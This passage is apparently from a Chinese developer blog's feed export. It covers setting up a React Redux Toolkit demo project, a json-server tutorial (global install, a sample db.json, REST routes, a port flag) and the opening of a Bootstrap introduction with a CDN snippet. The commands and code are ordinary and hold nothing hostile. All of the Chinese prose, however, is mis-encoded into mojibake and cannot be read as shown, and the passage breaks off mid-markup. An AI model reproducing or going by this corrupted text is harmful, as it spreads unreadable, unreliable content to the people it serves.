æ¡ˆä¾‹æ¼”ç¤ºå’Œç¯å¢ƒå‡†å¤‡"></a>14.4.1 æ¡ˆä¾‹æ¼”ç¤ºå’Œç¯å¢ƒå‡†å¤‡</h3><h4 id="1ï¼‰æ¡ˆä¾‹æ¼”ç¤º"><a href="#1ï¼‰æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="1ï¼‰æ¡ˆä¾‹æ¼”ç¤º"></a>1ï¼‰æ¡ˆä¾‹æ¼”ç¤º</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.22.39.png" style="zoom:40%;"><p>åŸºæœ¬å¼€å‘æ€è·¯ï¼šä½¿ç”¨ RTKï¼ˆRedux Toolkitï¼‰æ¥ç®¡ç†åº”ç”¨çŠ¶æ€, ç»„ä»¶è´Ÿè´£ æ•°æ®æ¸²æŸ“ å’Œ dispatch actionã€‚</p><h4 id="2ï¼‰å‡†å¤‡å¹¶ç†Ÿæ‚‰ç¯å¢ƒ"><a href="#2ï¼‰å‡†å¤‡å¹¶ç†Ÿæ‚‰ç¯å¢ƒ" class="headerlink" title="2ï¼‰å‡†å¤‡å¹¶ç†Ÿæ‚‰ç¯å¢ƒ"></a>2ï¼‰å‡†å¤‡å¹¶ç†Ÿæ‚‰ç¯å¢ƒ</h4><p>å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°ï¼ˆå†…ç½®äº†åŸºç¡€é™æ€ç»„ä»¶å’Œæ¨¡ç‰ˆï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone http://git.itcast.cn/heimaqianduan/redux-meituan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…æ‰€æœ‰ä¾èµ– </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯åŠ¨mockæœåŠ¡ï¼ˆå†…ç½®äº†json-serverï¼‰ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run serve<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯åŠ¨å‰ç«¯æœåŠ¡ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“"><a href="#å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“" class="headerlink" title="å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“"></a>å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“</h1><p>åŠ¨æ€æ§åˆ¶ç±»å‹åï¼šclassnames</p><p>ç”Ÿæˆå”¯ä¸€çš„éšæœºæ•°ï¼šuuid ï¼Œåœ°å€ï¼š<a href="https://github.com/uuidjs/uuid">https://github.com/uuidjs/uuid</a></p><p>ç”Ÿæˆå›ºå®šæ ¼å¼çš„æ—¶é—´ï¼šdayjs ï¼Œåœ°å€ï¼š<a href="https://day.js.org/zh-CN/">https://day.js.org/zh-CN/</a></p><h1 id="å¸¸ç”¨åº“"><a href="#å¸¸ç”¨åº“" class="headerlink" title="å¸¸ç”¨åº“"></a>å¸¸ç”¨åº“</h1><h2 id="x-1-json-server"><a href="#x-1-json-server" class="headerlink" title="x.1 json-server"></a>x.1 json-server</h2><p><code>json-server</code> æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Node.js æ¨¡å—ï¼Œç”¨äºå¿«é€Ÿæ­å»ºæœ¬åœ°çš„ RESTful API æœåŠ¡å™¨ã€‚å®ƒä½¿ç”¨ JSON æ–‡ä»¶ä½œä¸ºæ•°æ®æºï¼Œå¯ä»¥æ¨¡æ‹Ÿåç«¯æœåŠ¡å™¨çš„è¡Œä¸ºï¼Œéå¸¸é€‚åˆå‰ç«¯å¼€å‘äººå‘˜åœ¨åç«¯ API å°šæœªå°±ç»ªæ—¶è¿›è¡Œå¼€å‘å’Œæµ‹è¯•ã€‚ä»¥ä¸‹æ˜¯ <code>json-server</code> çš„ä¸€äº›ä¸»è¦ä½œç”¨å’ŒåŠŸèƒ½ï¼š</p><h3 id="x-1-1-ä¸»è¦ä½œç”¨"><a href="#x-1-1-ä¸»è¦ä½œç”¨" class="headerlink" title="x.1.1 ä¸»è¦ä½œç”¨"></a>x.1.1 ä¸»è¦ä½œç”¨</h3><ul><li><strong>å¿«é€Ÿæ­å»º API</strong>ï¼šæ— éœ€ç¼–å†™åç«¯ä»£ç ï¼Œåªéœ€æä¾›ä¸€ä¸ª JSON æ–‡ä»¶ï¼Œå³å¯å¿«é€Ÿç”Ÿæˆ RESTful é£æ ¼çš„ APIã€‚</li><li><strong>å‰åç«¯åˆ†ç¦»å¼€å‘</strong>ï¼šå‰ç«¯å¼€å‘è€…å¯ä»¥åœ¨ä¸ä¾èµ–åç«¯çš„æƒ…å†µä¸‹è¿›è¡Œå¼€å‘ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚</li><li><strong>æ¨¡æ‹Ÿåç«¯æ¥å£</strong>ï¼šåœ¨åç«¯æ¥å£å°šæœªå®Œæˆæ—¶ï¼Œå‰ç«¯å¯ä»¥ä½¿ç”¨ <code>json-server</code> æ¨¡æ‹Ÿæ•°æ®æ¥å£ï¼Œæ–¹ä¾¿è°ƒè¯•å’Œæµ‹è¯•ã€‚</li></ul><h3 id="x-1-2-ä½¿ç”¨æ–¹æ³•"><a href="#x-1-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="x.1.2 ä½¿ç”¨æ–¹æ³•"></a>x.1.2 ä½¿ç”¨æ–¹æ³•</h3><h4 id="1ï¼‰å®‰è£…-json-server"><a href="#1ï¼‰å®‰è£…-json-server" class="headerlink" title="1ï¼‰å®‰è£… json-server"></a>1ï¼‰å®‰è£… json-server</h4><p>é¦–å…ˆï¼Œä½ éœ€è¦åœ¨å…¨å±€èŒƒå›´å†…å®‰è£… <code>json-server</code>ã€‚æ‰“å¼€ç»ˆç«¯ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> json-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="è§£æƒ‘-ã€Œnpm-install-g-json-server-ä¸ºä»€ä¹ˆè¦åŠ -gå‚æ•°ï¼Ÿã€"><a href="#è§£æƒ‘-ã€Œnpm-install-g-json-server-ä¸ºä»€ä¹ˆè¦åŠ -gå‚æ•°ï¼Ÿã€" class="headerlink" title="è§£æƒ‘-ã€Œnpm install -g json-server ä¸ºä»€ä¹ˆè¦åŠ -gå‚æ•°ï¼Ÿã€"></a>è§£æƒ‘-ã€Œnpm install -g json-server ä¸ºä»€ä¹ˆè¦åŠ -gå‚æ•°ï¼Ÿã€</h4><p>åœ¨ä½¿ç”¨ <code>npm install</code> å‘½ä»¤æ—¶ï¼Œ<code>-g</code> å‚æ•°è¡¨ç¤ºå…¨å±€å®‰è£…ï¼ˆglobal installationï¼‰ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>-g</code> å‚æ•°çš„å‡ ä¸ªåŸå› å’Œå¥½å¤„ï¼š</p><ol><li><strong>å…¨å±€å¯ç”¨</strong></li></ol><ul><li><strong>æ— éœ€é¡¹ç›®ä¾èµ–</strong>ï¼šå…¨å±€å®‰è£…çš„åŒ…ä¸ä¼šè¢«æ·»åŠ åˆ°é¡¹ç›®çš„ <code>node_modules</code> ç›®å½•ä¸­ï¼Œå› æ­¤ä¸ä¼šæˆä¸ºé¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨ä»»ä½•é¡¹ç›®ä¸­ä½¿ç”¨è¯¥å·¥å…·ï¼Œè€Œä¸éœ€è¦åœ¨æ¯ä¸ªé¡¹ç›®ä¸­å•ç‹¬å®‰è£…ã€‚</li><li><strong>å‘½ä»¤è¡Œå·¥å…·</strong>ï¼šè®¸å¤š Node.js å·¥å…·ï¼ˆå¦‚ <code>json-server</code>ã€<code>create-react-app</code>ã€<code>eslint</code> ç­‰ï¼‰æ˜¯è®¾è®¡ä¸ºå‘½ä»¤è¡Œå·¥å…·ä½¿ç”¨çš„ã€‚å…¨å±€å®‰è£…åï¼Œå®ƒä»¬çš„å‘½ä»¤å¯ä»¥åœ¨ç³»ç»Ÿçš„ä»»ä½•åœ°æ–¹é€šè¿‡å‘½ä»¤è¡Œç›´æ¥è°ƒç”¨ï¼Œè€Œä¸éœ€è¦åœ¨ç‰¹å®šé¡¹ç›®çš„ä¸Šä¸‹æ–‡ä¸­ã€‚</li></ul><ol start="2"><li><strong>èŠ‚çœç©ºé—´</strong></li></ol><ul><li><strong>é¿å…é‡å¤å®‰è£…</strong>ï¼šå¦‚æœåœ¨å¤šä¸ªé¡¹ç›®ä¸­éƒ½éœ€è¦ä½¿ç”¨åŒä¸€ä¸ªå·¥å…·ï¼Œå…¨å±€å®‰è£…å¯ä»¥é¿å…åœ¨æ¯ä¸ªé¡¹ç›®çš„ <code>node_modules</code> ç›®å½•ä¸­é‡å¤å®‰è£…è¯¥å·¥å…·ï¼Œä»è€ŒèŠ‚çœç£ç›˜ç©ºé—´ã€‚</li></ul><ol start="3"><li><strong>ç®€åŒ–ç®¡ç†</strong></li></ol><ul><li><strong>ç»Ÿä¸€æ›´æ–°</strong>ï¼šå…¨å±€å®‰è£…çš„åŒ…å¯ä»¥é€šè¿‡ä¸€ä¸ªå‘½ä»¤è¿›è¡Œæ›´æ–°ï¼Œä¾‹å¦‚ <code>npm update -g</code>ï¼Œè¿™å¯ä»¥ç®€åŒ–å¯¹å…¨å±€å·¥å…·çš„ç®¡ç†ï¼Œç¡®ä¿æ‰€æœ‰é¡¹ç›®éƒ½èƒ½ä½¿ç”¨åˆ°æœ€æ–°ç‰ˆæœ¬çš„å·¥å…·ã€‚</li></ul></blockquote><blockquote><h4 id="å¤§æˆ˜bug-ã€Œno-matching-version-found-for-tinyhttp-logger-2-0-0ã€"><a href="#å¤§æˆ˜bug-ã€Œno-matching-version-found-for-tinyhttp-logger-2-0-0ã€" class="headerlink" title="å¤§æˆ˜bug-ã€Œno matching version found for @tinyhttp/logger@^2.0.0ã€"></a>å¤§æˆ˜bug-ã€Œno matching version found for @tinyhttp/logger@^2.0.0ã€</h4><p>åˆ†ææ˜¯å› ä¸ºæœ€æ–°ç‰ˆæœ¬çš„ä¾èµ–é—®é¢˜ï¼Œå®‰è£…ç‰¹å®šçš„æ—§ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> json-server@0.17.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="2ï¼‰åˆ›å»º-JSON-æ•°æ®æ–‡ä»¶"><a href="#2ï¼‰åˆ›å»º-JSON-æ•°æ®æ–‡ä»¶" class="headerlink" title="2ï¼‰åˆ›å»º JSON æ•°æ®æ–‡ä»¶"></a>2ï¼‰åˆ›å»º JSON æ•°æ®æ–‡ä»¶</h4><p>åœ¨ä½ çš„é¡¹ç›®ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ª JSON æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>db.json</code>ã€‚è¿™ä¸ªæ–‡ä»¶å°†ä½œä¸ºä½ çš„æ•°æ®åº“ï¼Œå­˜å‚¨æ¨¡æ‹Ÿæ•°æ®ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"posts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"json-server"</span><span class="token punctuation">,</span> <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"typicode"</span> <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"comments"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"body"</span><span class="token operator">:</span> <span class="token string">"some comment"</span><span class="token punctuation">,</span> <span class="token property">"postId"</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"profile"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"typicode"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3ï¼‰å¯åŠ¨-json-server"><a href="#3ï¼‰å¯åŠ¨-json-server" class="headerlink" title="3ï¼‰å¯åŠ¨ json-server"></a>3ï¼‰å¯åŠ¨ json-server</h4><p>åœ¨ç»ˆç«¯ä¸­ï¼Œå¯¼èˆªåˆ°åŒ…å« <code>db.json</code> æ–‡ä»¶çš„ç›®å½•ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨ <code>json-server</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">json-server <span class="token parameter variable">--watch</span> db.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°†å¯åŠ¨ä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨ï¼Œé»˜è®¤ç›‘å¬åœ¨ <code>http://localhost:3000</code>ã€‚ä½ å¯ä»¥é€šè¿‡è®¿é—®ä¸åŒçš„ URL æ¥è·å–æ•°æ®ï¼š</p><ul><li><code>http://localhost:3000/posts</code>ï¼šè·å–æ‰€æœ‰æ–‡ç« </li><li><code>http://localhost:3000/comments</code>ï¼šè·å–æ‰€æœ‰è¯„è®º</li><li><code>http://localhost:3000/profile</code>ï¼šè·å–ç”¨æˆ·èµ„æ–™</li></ul><h4 id="4ï¼‰ä½¿ç”¨-json-server-çš„-RESTful-API"><a href="#4ï¼‰ä½¿ç”¨-json-server-çš„-RESTful-API" class="headerlink" title="4ï¼‰ä½¿ç”¨ json-server çš„ RESTful API"></a>4ï¼‰ä½¿ç”¨ json-server çš„ RESTful API</h4><p><code>json-server</code> æä¾›äº†å®Œæ•´çš„ RESTful APIï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><ul><li><strong>GET</strong>ï¼šè·å–æ•°æ®<ul><li><code>GET /posts</code>ï¼šè·å–æ‰€æœ‰æ–‡ç« </li><li><code>GET /posts/1</code>ï¼šè·å– ID ä¸º 1 çš„æ–‡ç« </li></ul></li><li><strong>POST</strong>ï¼šåˆ›å»ºæ•°æ®<ul><li><code>POST /posts</code>ï¼šåˆ›å»ºæ–°æ–‡ç« </li></ul></li><li><strong>PUT</strong>ï¼šæ›´æ–°æ•°æ®<ul><li><code>PUT /posts/1</code>ï¼šæ›´æ–° ID ä¸º 1 çš„æ–‡ç« </li></ul></li><li><strong>PATCH</strong>ï¼šéƒ¨åˆ†æ›´æ–°æ•°æ®<ul><li><code>PATCH /posts/1</code>ï¼šæ›´æ–° ID ä¸º 1 çš„æ–‡ç« çš„éƒ¨åˆ†å­—æ®µ</li></ul></li><li><strong>DELETE</strong>ï¼šåˆ é™¤æ•°æ®<ul><li><code>DELETE /posts/1</code>ï¼šåˆ é™¤ ID ä¸º 1 çš„æ–‡ç« </li></ul></li></ul><h4 id="5ï¼‰é…ç½®-json-server"><a href="#5ï¼‰é…ç½®-json-server" class="headerlink" title="5ï¼‰é…ç½® json-server"></a>5ï¼‰é…ç½® json-server</h4><p>ä½ å¯ä»¥é€šè¿‡æ·»åŠ æ›´å¤šé€‰é¡¹æ¥é…ç½® <code>json-server</code>ï¼š</p><ul><li><p><strong>æŒ‡å®šç«¯å£</strong>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">json-server <span class="token parameter variable">--watch</span> db.json <span class="token parameter variable">--port</span> <span class="token number">3001</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><ul><li><a href="https://www.runoob.com/react/react-jsx.html">https://www.runoob.com/react/react-jsx.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯å¼€å‘ </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/bootstrap/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/bootstrap/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Bootstrap-ç®€ä»‹"><a href="#ä¸€ã€Bootstrap-ç®€ä»‹" class="headerlink" title="ä¸€ã€Bootstrap ç®€ä»‹"></a>ä¸€ã€Bootstrap ç®€ä»‹</h1><p><strong>Bootstrap</strong> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ã€å“åº”å¼ã€å¼€æºçš„å‰ç«¯æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ç°ä»£åŒ–ç½‘ç«™å’Œ Web åº”ç”¨ç¨‹åºã€‚å®ƒç”± Twitter çš„ Mark Otto å’Œ Jacob Thornton åˆ›å»ºï¼Œæœ€åˆå‘å¸ƒäº 2011 å¹´ï¼Œç›®å‰ç”±ç¤¾åŒºå’Œå¼€å‘è€…ç§¯æç»´æŠ¤ã€‚</p><h1 id="äºŒã€æ ¸å¿ƒç‰¹ç‚¹"><a href="#äºŒã€æ ¸å¿ƒç‰¹ç‚¹" class="headerlink" title="äºŒã€æ ¸å¿ƒç‰¹ç‚¹"></a>äºŒã€æ ¸å¿ƒç‰¹ç‚¹</h1><h2 id="2-1-å“åº”å¼è®¾è®¡"><a href="#2-1-å“åº”å¼è®¾è®¡" class="headerlink" title="2.1 å“åº”å¼è®¾è®¡"></a>2.1 <strong>å“åº”å¼è®¾è®¡</strong></h2><p>Bootstrap æä¾›äº†åŸºäº <strong>12 åˆ—ç½‘æ ¼ç³»ç»Ÿ</strong> çš„å¸ƒå±€å·¥å…·ï¼Œä½¿é¡µé¢èƒ½å¤Ÿé€‚é…ä¸åŒå°ºå¯¸çš„å±å¹•è®¾å¤‡ï¼ˆå¦‚æ‰‹æœºã€å¹³æ¿ã€æ¡Œé¢ï¼‰ã€‚</p><blockquote><ul><li><h3 id="ä½•ä¸ºå“åº”å¼è®¾è®¡ï¼Ÿ"><a href="#ä½•ä¸ºå“åº”å¼è®¾è®¡ï¼Ÿ" class="headerlink" title="ä½•ä¸ºå“åº”å¼è®¾è®¡ï¼Ÿ"></a>ä½•ä¸ºå“åº”å¼è®¾è®¡ï¼Ÿ</h3></li></ul><p><strong>å“åº”å¼è®¾è®¡</strong>ï¼ˆResponsive Web Designï¼Œç®€ç§° RWDï¼‰æ˜¯ä¸€ç§ Web å¼€å‘æŠ€æœ¯ï¼Œæ—¨åœ¨ä½¿ç½‘é¡µèƒ½å¤Ÿæ ¹æ®ç”¨æˆ·è®¾å¤‡çš„å±å¹•å¤§å°ã€åˆ†è¾¨ç‡å’Œæ–¹å‘è‡ªåŠ¨è°ƒæ•´å¸ƒå±€å’Œå†…å®¹ï¼Œä»è€Œæä¾›ä¸€è‡´ä¸”å‹å¥½çš„ç”¨æˆ·ä½“éªŒã€‚</p><p>å“åº”å¼è®¾è®¡çš„ç›®æ ‡æ˜¯<strong>ä¸€å¥—ä»£ç é€‚é…å¤šç§è®¾å¤‡</strong>ï¼Œæ— è®ºç”¨æˆ·ä½¿ç”¨çš„æ˜¯æ¡Œé¢ã€å¹³æ¿è¿˜æ˜¯æ‰‹æœºï¼Œé¡µé¢éƒ½èƒ½æ¸…æ™°æ˜“ç”¨ï¼Œé¿å…ç¼©æ”¾ã€æ¨ªå‘æ»šåŠ¨ç­‰ä¸ä¾¿ã€‚</p><h3 id="å“åº”å¼è®¾è®¡çš„ç‰¹ç‚¹"><a href="#å“åº”å¼è®¾è®¡çš„ç‰¹ç‚¹" class="headerlink" title="å“åº”å¼è®¾è®¡çš„ç‰¹ç‚¹"></a>å“åº”å¼è®¾è®¡çš„ç‰¹ç‚¹</h3><ol><li><strong>è‡ªåŠ¨é€‚é…å±å¹•å°ºå¯¸</strong><ul><li>é¡µé¢å¸ƒå±€ã€å­—ä½“å¤§å°ã€å›¾ç‰‡æ¯”ä¾‹ç­‰ä¼šæ ¹æ®è®¾å¤‡å˜åŒ–è‡ªåŠ¨è°ƒæ•´ã€‚</li></ul></li><li><strong>æå‡ç”¨æˆ·ä½“éªŒ</strong><ul><li>æ— éœ€ç”¨æˆ·æ‰‹åŠ¨ç¼©æ”¾æˆ–æ¨ªå‘æ»šåŠ¨ï¼Œå†…å®¹æ›´æ˜“è¯»ã€æ“ä½œæ›´ä¾¿æ·ã€‚</li></ul></li><li><strong>èŠ‚çœå¼€å‘æ—¶é—´</strong><ul><li>ç›¸è¾ƒäºä¸ºæ¯ç§è®¾å¤‡å¼€å‘å•ç‹¬çš„é¡µé¢ï¼Œå“åº”å¼è®¾è®¡ä¸€æ¬¡å¼€å‘å³å¯é€‚é…å¤šç«¯ã€‚</li></ul></li></ol></blockquote><blockquote><ul><li><h3 id="ä½•ä¸ºSEOï¼Ÿ"><a href="#ä½•ä¸ºSEOï¼Ÿ" class="headerlink" title="ä½•ä¸ºSEOï¼Ÿ"></a>ä½•ä¸ºSEOï¼Ÿ</h3></li></ul><p><strong>SEO</strong> æ˜¯ <strong>Search Engine Optimization</strong> çš„ç¼©å†™ï¼Œä¸­æ–‡ç§°ä¸º<strong>æœç´¢å¼•æ“ä¼˜åŒ–</strong>ã€‚å®ƒæ˜¯ä¸€ç§é€šè¿‡ä¼˜åŒ–ç½‘ç«™å†…å®¹ã€ç»“æ„å’Œå¤–éƒ¨é“¾æ¥ç­‰æ–¹å¼ï¼Œæé«˜ç½‘ç«™åœ¨æœç´¢å¼•æ“ä¸­çš„æ’åï¼Œä»è€Œå¢åŠ ç½‘ç«™è‡ªç„¶æµé‡çš„æŠ€æœ¯å’Œç­–ç•¥ã€‚</p><p>SEO çš„ç›®æ ‡æ˜¯è®©ç½‘ç«™æ›´å®¹æ˜“è¢«æœç´¢å¼•æ“æŠ“å–ã€ç†è§£å’Œæ¨èï¼Œä»è€Œåœ¨ç”¨æˆ·æœç´¢ç›¸å…³å…³é”®è¯æ—¶ï¼Œèƒ½ä¼˜å…ˆå±•ç¤ºåœ¨æœç´¢ç»“æœé¡µé¢ï¼ˆSERPï¼ŒSearch Engine Results Pageï¼‰é å‰çš„ä½ç½®ã€‚</p></blockquote><h2 id="2-2-é¢„åˆ¶æ ·å¼å’Œç»„ä»¶"><a href="#2-2-é¢„åˆ¶æ ·å¼å’Œç»„ä»¶" class="headerlink" title="2.2 é¢„åˆ¶æ ·å¼å’Œç»„ä»¶"></a>2.2 <strong>é¢„åˆ¶æ ·å¼å’Œç»„ä»¶</strong></h2><p>å†…ç½®å¤§é‡é¢„åˆ¶æ ·å¼å’Œ UI ç»„ä»¶ï¼Œèƒ½å¿«é€Ÿæ„å»ºç°ä»£åŒ–é¡µé¢ï¼š</p><ul><li>å¸¸è§çš„ CSS æ ·å¼ï¼šæŒ‰é’®ã€è¡¨å•ã€æ’ç‰ˆç­‰ã€‚</li><li>UI ç»„ä»¶ï¼šå¯¼èˆªæ ã€æ¨¡æ€æ¡†ã€å¡ç‰‡ã€æ ‡ç­¾é¡µç­‰ã€‚</li></ul><h2 id="2-3-ç§»åŠ¨ä¼˜å…ˆ"><a href="#2-3-ç§»åŠ¨ä¼˜å…ˆ" class="headerlink" title="2.3 ç§»åŠ¨ä¼˜å…ˆ"></a>2.3 <strong>ç§»åŠ¨ä¼˜å…ˆ</strong></h2><p>é»˜è®¤é‡‡ç”¨â€œç§»åŠ¨ä¼˜å…ˆâ€è®¾è®¡ç†å¿µï¼Œç¡®ä¿é¡µé¢åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šçš„ä½“éªŒä¼˜å…ˆï¼ŒåŒæ—¶é€‚é…æ›´å¤§çš„å±å¹•ã€‚</p><h2 id="2-4-å¼ºå¤§çš„æ‰©å±•èƒ½åŠ›"><a href="#2-4-å¼ºå¤§çš„æ‰©å±•èƒ½åŠ›" class="headerlink" title="2.4 å¼ºå¤§çš„æ‰©å±•èƒ½åŠ›"></a>2.4 <strong>å¼ºå¤§çš„æ‰©å±•èƒ½åŠ›</strong></h2><p>æ”¯æŒè‡ªå®šä¹‰å’Œæ‰©å±•ï¼Œå¼€å‘è€…å¯ä»¥åœ¨å…¶åŸºç¡€ä¸Šå¼€å‘è‡ªå·±çš„æ ·å¼æˆ–åŠŸèƒ½ã€‚</p><h2 id="2-5-åŸºäº-HTMLã€CSS-å’Œ-JavaScript"><a href="#2-5-åŸºäº-HTMLã€CSS-å’Œ-JavaScript" class="headerlink" title="2.5 åŸºäº HTMLã€CSS å’Œ JavaScript"></a>2.5 <strong>åŸºäº HTMLã€CSS å’Œ JavaScript</strong></h2><p>Bootstrap æä¾›çš„åŠŸèƒ½ä¸»è¦åŸºäº HTML å’Œ CSSï¼ŒåŒæ—¶ä¹Ÿå†…ç½®äº†è®¸å¤šäº¤äº’åŠŸèƒ½ï¼Œä¾èµ–äºå…¶è‡ªå¸¦çš„ JavaScript æˆ– jQueryã€‚</p><h2 id="2-6-ä¸°å¯Œçš„æ–‡æ¡£"><a href="#2-6-ä¸°å¯Œçš„æ–‡æ¡£" class="headerlink" title="2.6 ä¸°å¯Œçš„æ–‡æ¡£"></a>2.6 <strong>ä¸°å¯Œçš„æ–‡æ¡£</strong></h2><p>Bootstrap çš„æ–‡æ¡£è¯¦ç»†ã€æ˜“æ‡‚ï¼Œæä¾›å¤§é‡ç¤ºä¾‹ä»£ç å’Œç”¨æ³•è¯´æ˜ï¼Œä¾¿äºå¼€å‘è€…å¿«é€Ÿä¸Šæ‰‹ã€‚</p><h1 id="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"><a href="#ä¸‰ã€ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"></a>ä¸‰ã€ä½¿ç”¨æ–¹æ³•</h1><h2 id="3-1-å¼•å…¥æ–¹å¼"><a href="#3-1-å¼•å…¥æ–¹å¼" class="headerlink" title="3.1 å¼•å…¥æ–¹å¼"></a>3.1 <strong>å¼•å…¥æ–¹å¼</strong></h2><p>Bootstrap æä¾›äº†å¤šç§æ–¹å¼æ¥å¼•å…¥ï¼ŒåŒ…æ‹¬ CDN å’Œæœ¬åœ°å®‰è£…ã€‚</p><p><strong>é€šè¿‡ CDN å¼•å…¥</strong>ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap ç¤ºä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- å¼•å…¥ Bootstrap CSS --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token 